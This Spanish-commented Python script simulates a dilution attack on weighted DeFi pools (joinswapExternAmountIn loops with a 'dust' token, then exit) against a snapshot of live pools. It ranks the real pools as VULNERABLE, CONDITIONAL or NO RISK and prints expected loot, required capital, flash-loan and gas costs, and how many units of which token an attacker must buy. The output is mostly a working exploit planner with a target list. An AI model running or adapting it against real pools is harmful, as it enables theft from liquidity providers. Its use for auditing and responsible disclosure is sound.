"""
Veredicto por pool a partir del snapshot real (data/pools_live.csv).

Etapa 1 - rho:      rho_i = v_i / (w_i * TVL_preciado)
                    atacable si rho_i < rho*(w_i)
Etapa 2 - ataque:   simulacion exacta (aritmetica del contrato) de
                        n x joinswapExternAmountIn(token_polvo, 50% de su reserva)
                        exitPool(BPT obtenido)
                    -> fraccion del pool capturada, P&L neto, capital, llamadas.
Etapa 3 - tokens sin precio: no se puede calcular rho; se calcula el PRECIO DE
                    EQUILIBRIO p* por debajo del cual el pool pasa a ser vulnerable.

Escala: 1 unidad raw = 1e-18 USD (todo normalizado a USD), luego el modelo es
invariante a decimales y comparable entre pools.  La fraccion diluida por
llamada NO depende de bI (verificado): solo de aI/bI y w, asi que el capital
necesario es 0.5*bI del token objetivo -- si su reserva es polvo, el ataque es
practicamente gratis.

Uso:  python3 analyze_live.py [data/pools_live.csv]
"""
import csv
import sys
from bmath_sim import (Pool, Revert, bmul, btoi, BONE, MAX_IN_RATIO,
                       calcSingleOutGivenPoolIn, calcPoolOutGivenSingleIn)

RHO_STAR = {0.02: 0.8154, 0.05: 0.8190, 0.10: 0.8274, 0.20: 0.8445, 0.30: 0.8622,
            0.40: 0.8803, 0.50: 0.8989, 0.60: 0.9180, 0.70: 0.9376, 0.80: 0.9578,
            0.90: 0.9786, 0.95: 0.9892}


def rho_star(w):
    ks = sorted(RHO_STAR)
    if w <= ks[0]:
        return RHO_STAR[ks[0]]
    if w >= ks[-1]:
        return RHO_STAR[ks[-1]]
    for a, b in zip(ks, ks[1:]):
        if a <= w <= b:
            return RHO_STAR[a] + (RHO_STAR[b] - RHO_STAR[a]) * (w - a) / (b - a)


def kv(s):
    out = {}
    for part in s.split("|"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def attack(tokens, fee, max_calls=300, cap_usd=5e7):
    """tokens: [{w, raw, px}] en unidades raw homogeneas.

    Contabilidad en ENTEROS exactos (nunca se restan floats del orden del
    capital: ese fue el artefacto del barrido anterior).  El bucle se corta
    cuando el capital movilizado supera cap_usd, que es lo maximo que un flash
    loan puede cubrir de forma realista por operacion.
    """
    tvl = sum(int(t["raw"]) for t in tokens)          # px uniforme => 1 wei = 1e-18 $
    if tvl <= 0:
        return None
    worst = min(range(len(tokens)),
                key=lambda i: (tokens[i]["raw"] * (1 if True else 1)) / (tokens[i]["w"] * tvl)
                if tokens[i]["w"] > 0 else 9e9)
    w = tokens[worst]["w"]
    syms = [f"T{i}" for i in range(len(tokens))]
    pool = Pool([{"sym": f"T{i}", "dec": 18, "bal": max(int(t["raw"]), 4),
                  "denorm": max(int(t["w"] * BONE), 1)} for i, t in enumerate(tokens)],
                fee=fee)
    psym = syms[worst]
    tw = pool.tW
    pS_start = pool.pS
    paid_raw = 0
    best = None
    for n in range(1, max_calls + 1):
        cap = bmul(pool.t[psym]["bal"], MAX_IN_RATIO)
        if cap < 1:
            break
        try:
            pool.joinswapExternAmountIn(psym, cap, 0)
        except Revert:
            break
        paid_raw += cap
        paid_usd = paid_raw * tokens[worst]["px"]
        if paid_usd > cap_usd:
            break
        mine = pool.pS - pS_start
        if mine <= 0:
            continue
        # (a) exitPool pro-rata de todas las reservas
        out_pro = 0
        for i, s in enumerate(syms):
            out_pro += pool.t[s]["bal"] * mine // pool.pS
        # (b) exitswapPoolAmountIn: quemar `mine` y sacar UN solo token
        out_one, which = 0, None
        try:
            for i, s in enumerate(syms):
                o = calcSingleOutGivenPoolIn(pool.t[s]["bal"], pool.t[s]["denorm"],
                                             pool.pS, tw, mine, fee)
                if o > out_one:
                    out_one, which = o, syms[i]
        except Revert:
            out_one, which = 0, None
        if out_pro >= out_one:
            got, mode = out_pro, "pro-rata"
        else:
            got, mode = out_one, f"mono:{tokens[int(which[1:])]['name']}"
        pnl = (got - paid_raw) * tokens[worst]["px"]      # exacto: enteros primero
        if best is None or pnl > best["pnl"]:
            best = dict(n=n, pnl=pnl, paid=paid_usd, paid_raw=paid_raw,
                        got=got * tokens[worst]["px"],
                        frac=mine / pool.pS, w=w, exit_mode=mode,
                        dust=tokens[worst]["name"], tok=worst)
        if mine >= pool.pS - 1:
            break
    return best


def safe_float(s, default=None):
    try:
        return float(s)
    except (TypeError, ValueError):
        return default


def analyse(path="data/pools_live.csv"):
    out = []
    for r in csv.DictReader(open(path)):
        toks = kv(r["tokens_csv"].replace(" ", ""))
        wts = kv(r["weights_norm_pct"])
        bals = kv(r["balances_amt"])
        pxs = kv(r["prices_usd"])
        names = list(toks.keys()) or list(wts.keys())
        # pesos: imputar el residual a los que vienen como NA
        known = {n: float(wts[n].rstrip("%")) for n in names
                 if n in wts and safe_float(wts[n].rstrip("%")) is not None}
        missing = [n for n in names if n not in known]
        if missing:
            resid = max(0.0, 100.0 - sum(known.values()))
            for n in missing:
                known[n] = resid / len(missing)
        tot_w = sum(known.values()) or 100.0
        tokens = []
        for n in names:
            w = known[n] / tot_w
            bal = safe_float(bals.get(n), 0.0) or 0.0
            px = safe_float(pxs.get(n))
            tokens.append(dict(name=n, w=w, bal=bal, px=px))
        tvl = sum(t["bal"] * t["px"] for t in tokens if t["px"] is not None)
        unpriced = [t for t in tokens if t["px"] is None]
        rec = dict(pool=r["pool"], risk=r["risk"], tvl=tvl,
                   n_tokens=len(tokens), unpriced=len(unpriced),
                   unpriced_names=",".join(t["name"] for t in unpriced),
                   supply=safe_float(r["supply"], 0.0), pnl=0.0, verdict="",
                   n=0, pay=0.0, pay_raw=0, frac=0.0, w=0.0, why="", pstar=None,
                   dust_name="", dust_px=0.0, dust_units_pool=0.0,
                   units=0.0, first=0.0, got=0.0,
                   one_pnl=0.0, one_paid=0.0, one_frac=0.0)

        if r["finalized"] != "True":
            rec["verdict"] = "NO APLICA"
            rec["why"] = "sin finalizar: finalize() lo activa"
            out.append(rec)
            continue
        if (rec["supply"] or 0) == 0:
            rec["verdict"] = "NO APLICA"
            rec["why"] = "supply 0 (nadie puede entrar/salir)"
            out.append(rec)
            continue
        if rec["n_tokens"] < 2:
            rec["verdict"] = "SIN RIESGO"
            rec["why"] = "1 solo token: no hay segunda pata que robar"
            out.append(rec)
            continue

        # ---- etapa 1: rho de los tokens con precio
        priced = [t for t in tokens if t["px"] is not None]
        rhos = [(t["bal"] * t["px"] / (t["w"] * tvl) if (tvl > 0 and t["w"] > 0) else 0.0, t)
                for t in priced]
        worst_rho, worst_tok = min(rhos) if rhos else (None, None)
        cand = bool(worst_tok) and worst_rho < rho_star(worst_tok["w"])
        rec["rho"] = worst_rho
        rec["rho_w"] = worst_tok["w"] if worst_tok else None
        rec["worst_tok"] = worst_tok["name"] if worst_tok else ""
        rec["rho_star"] = rho_star(worst_tok["w"]) if worst_tok else None

        # ---- etapa 2: ataque exacto sobre el modelo homogeneo en USD
        mt = [dict(w=t["w"], name=t["name"],
               raw=max(int(t["bal"] * (t["px"] if t["px"] is not None else 0.0) * 1e18), 4),
               px=1e-18) for t in tokens]
        fee = int((safe_float(r["swap_fee"], 0.003) or 0.003) * BONE)
        res = attack(mt, fee) if (cand or unpriced) else None
        if res:
            one = attack(mt, fee, max_calls=1)
            if one:
                rec["one_pnl"] = one["pnl"]
                rec["one_paid"] = one["paid"]
                rec["one_frac"] = one["frac"]
        if res:
            _d = next((t for t in tokens if t["name"] == res["dust"]), None)
            if _d and _d["px"]:
                rec["dust_px"] = _d["px"]
                rec["dust_units_pool"] = _d["bal"]
                rec["units"] = res["paid"] / _d["px"]
                rec["first"] = 0.5 * _d["bal"] * _d["px"]
            rec.update(n=res["n"], frac=res["frac"], pay=res["paid"],
                       pay_raw=res["paid_raw"], dust_name=res["dust"],
                       pnl=res["pnl"], w=res["w"], dust=res["dust"],
                       exit_mode=res["exit_mode"], got=res["got"])
        # ---- etapa 3: precio de equilibrio para tokens sin precio
        if unpriced:
            ps = []
            for t in unpriced:
                ws_ = t["w"]
                rs = rho_star(ws_)
                denom = t["bal"] * (1 - rs * ws_)
                ps.append((rs * ws_ * tvl / denom) if denom > 0 else None)
            ps = [x for x in ps if x is not None]
            rec["pstar"] = max(ps) if ps else None

        if cand:
            rec["verdict"] = "VULNERABLE"
            rec["why"] = (f"rho={worst_rho:.3f} < rho*={rec['rho_star']:.3f} "
                          f"({worst_tok['name']}, w={worst_tok['w']*100:.0f}%)")
        elif unpriced:
            rec["verdict"] = "CONDICIONAL"
            rec["why"] = "token(s) sin precio: " + rec["unpriced_names"]
            if rec["pstar"] and rec["tvl"] > 0:
                rec["pnl"] = rec["tvl"]   # escenario "token muerto": TVL entero
        else:
            rec["verdict"] = "SIN RIESGO"
            rec["why"] = (f"rho_min={worst_rho:.3f} >= rho*={rec['rho_star']:.3f} "
                          f"({worst_tok['name']}, w={worst_tok['w']*100:.0f}%)" if worst_tok else "")
        out.append(rec)

    out.sort(key=lambda x: -x["pnl"])
    return out


def emit(out, md=False):
    if md:
        return emit_md(out)
    print(f"{'pool':<44}{'TVL live':>12}{'veredicto':>14}{'P&L est':>13}"
          f"{'capital':>11}{'frac':>7}{'n':>4}  detalle")
    print("-" * 150)
    tot = {}
    for x in out:
        tot[x["verdict"]] = tot.get(x["verdict"], 0) + max(x["pnl"], 0)
        extra = ""
        if x.get("pstar"):
            extra = f" | p*={x['pstar']:.4g} $/token"
        cap = (f"{x['pay']:>13,.0f}$" if x["verdict"] == "VULNERABLE"
               else (f"{x['pay_raw']:.1e} u" if x["pay_raw"] else ""))
        print(f"{x['pool']:<44}{x['tvl']:>12,.0f}{x['verdict']:>14}{x['pnl']:>13,.0f}"
              f"{cap:>14}{x['frac']*100:>6.1f}%{x['n'] or '':>4}  "
              f"{x.get('exit_mode','')} {x['why']}{extra}")
    print("\n== exposicion estimada por veredicto ==")
    for k, v in sorted(tot.items(), key=lambda kv_: -kv_[1]):
        print(f"  {k:<14} ${v:>13,.0f}")
    print(f"  {'TOTAL':<14} ${sum(tot.values()):>13,.0f}")


def emit_capital(out):
    """Cuanto tiene que comprar el atacante, en unidades del token, en dos regimenes."""
    V = [x for x in sorted(out, key=lambda x: -x["pnl"])
         if x["verdict"] == "VULNERABLE" and x["pnl"] > 1 and x.get("units")]
    h1 = (f"{'pool':<12}{'comprar':<8}{'unidades':>15}{'valor $':>12}"
          f"{'BPT':>11}{'botin':>11}")
    print("A) ATAQUE MINIMO -- una sola llamada, sin flash loan\n" + h1)
    print("-" * len(h1))
    for x in V:
        print(f"{x['pool'][:10]:<12}{x['dust_name'][:7]:<8}"
              f"{x['dust_units_pool']*0.5:>15,.4g}"
              f"{x['one_paid']:>12,.2f}{x['one_frac']*100:>10.1f}%{x['one_pnl']:>11,.0f}")
    print(f"{'':<12}{'(deposito = 50% de la reserva que hay en el pool)':>63}")
    print("(salida mono-token: en un pool desequilibrado sacar UN token da mas que el pro-rata)")

    h2 = (f"\n{'pool':<12}{'comprar':<8}{'unidades':>15}{'valor $':>12}"
          f"{'1er deposito':>14}{'reserva hoy':>13}{'n':>4}{'entra':>10}{'neto':>11}")
    print("\nB) ATAQUE OPTIMO -- bucle de compresion (importe recuperado en la misma tx)\n" + h2)
    print("-" * len(h2))
    tp = tv = 0.0
    for x in V:
        tp += x["pnl"]; tv += x["pay"]
        print(f"{x['pool'][:10]:<12}{x['dust_name'][:7]:<8}{x['units']:>15,.4g}"
              f"{x['pay']:>12,.0f}{x['first']:>14,.2f}{x['dust_units_pool']:>13,.4g}"
              f"{x['n']:>4}{x['got']:>10,.0f}{x['pnl']:>11,.0f}")
    print("-" * len(h2))
    print(f"{'TOTAL':<12}{'':<8}{'':>15}{tv:>12,.0f}{'':>14}{'':>13}{'':>4}"
          f"{'':>10}{tp:>11,.0f}")
    print("\n'unidades' = cuanto token hay que tener (o pedir prestado) en total.")
    print("'valor $'  = a cuanto asciende; se recupera al salir, no se pierde.")
    print("'reserva hoy' = unidades en el pool: es lo que hace falta multiplicar por 1,5^n.")
    print("Coste real = fee del flash loan (0,05%) + gas (~120k por llamada).")


def emit_capital_md(out):
    V = [x for x in sorted(out, key=lambda x: -x["pnl"])
         if x["verdict"] == "VULNERABLE" and x["pnl"] > 1 and x.get("units")]
    A = ["| pool | token a comprar | unidades (1 llamada) | coste | BPT obtenido | botin |",
         "|---|---|---:|---:|---:|---:|"]
    for x in V:
        A.append("| `%s` | %s | %s | $%s | %s%% | $%s |" % (
            x["pool"], x["dust_name"], _es(x["dust_units_pool"] * 0.5, ".3g"),
            _es(x["one_paid"], ",.2f"), _es(x["one_frac"] * 100, ".1f"), _es(x["one_pnl"])))
    B = ["| pool | token a comprar | unidades totales | valor | 1er deposito | reserva en el pool hoy | n | botin |",
         "|---|---|---:|---:|---:|---:|---:|---:|"]
    for x in V:
        B.append("| `%s` | %s | %s | $%s | $%s | %s | %d | $%s |" % (
            x["pool"], x["dust_name"], _es(x["units"], ".4g"),
            _es(x["pay"]), _es(x["first"], ",.2f"),
            _es(x["dust_units_pool"], ".3g"), x["n"], _es(x["pnl"])))
    return "\n".join(A) + "\n\n" + "\n".join(B)


def _es(v, fmt=", .0f".replace(" ", "")):
    """numero -> cadena con separadores espanoles (135,358 -> 135.358)"""
    t = format(v, fmt)
    return t.translate(str.maketrans({",": ".", ".": ","}))


def emit_md(out):
    A = ["| pool | TVL hoy | \u03c1 | reserva depositada | bot\u00edn | capital | f | llamadas | salida |",
         "|---|---|---:|---|---:|---:|---:|---:|---|"]
    B = ["| pool | TVL | token sin precio | p* | unidades a conseguir |",
         "|---|---:|---|---:|---:|"]
    for x in out:
        if x["verdict"] == "VULNERABLE" and x["pnl"] > 0:
            tvl = _es(x["tvl"])
            rho = _es(x["rho"], ".3f")
            pnl = _es(x["pnl"])
            cap = _es(x["pay"])
            wt = x["worst_tok"]
            wpc = f"{x['rho_w']*100:.0f}"
            A.append("| `%s` | $%s | %s | %s, w=%s%% | $%s | $%s | %.0f%% | %d | %s |"
                     % (x["pool"], tvl, rho, wt, wpc, pnl, cap,
                        x["frac"] * 100, x["n"], x.get("exit_mode", "")))
    for x in out:
        if x["verdict"] == "CONDICIONAL" and x["pnl"] > 0:
            tvl = _es(x["tvl"])
            if x.get("pstar"):
                ps = "$" + _es(x["pstar"], ".4g")
            else:
                ps = "n/d"
            units = _es(x["pay_raw"], ".1e") if x["pay_raw"] else "\u2014"
            B.append("| `%s` | $%s | %s | %s | %s |"
                     % (x["pool"], tvl, x["unpriced_names"], ps, units))
    return "\n".join(A) + "\n\n" + "\n".join(B)


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    path = args[0] if args else "data/pools_live.csv"
    res = analyse(path)
    if "--md" in sys.argv:
        print(emit_md(res))
    elif "--capital-md" in sys.argv:
        print(emit_capital_md(res))
    elif "--capital" in sys.argv:
        emit_capital(res)
    else:
        emit(res)
